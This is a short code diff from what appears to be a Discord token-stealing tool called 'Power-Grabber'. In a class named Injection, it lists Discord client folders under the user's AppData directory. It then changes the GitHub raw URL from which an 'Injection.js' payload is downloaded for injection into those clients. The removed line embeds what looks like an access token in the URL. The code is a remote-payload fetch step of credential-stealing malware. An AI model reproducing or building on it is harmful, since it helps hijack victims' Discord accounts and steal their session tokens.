@@ -14,7 +14,7 @@ class Injection:
                 self.appdata + '\\DiscordPTB',
                 self.appdata + '\\DiscordDevelopment'
             ]
-            response = requests.get('https://raw.githubusercontent.com/Powercascade/Power-Grabber-Resources/refs/heads/main/Injection.js?token=GHSAT0AAAAAAC5ER2TVZ3UJOVRNTJMYIDM4Z4MEJEA')
+            response = requests.get('https://raw.githubusercontent.com/Powercascade/Power-Grabber-Injection/refs/heads/main/Injection.js')
             if response.status_code != 200:
                 pass
                 return
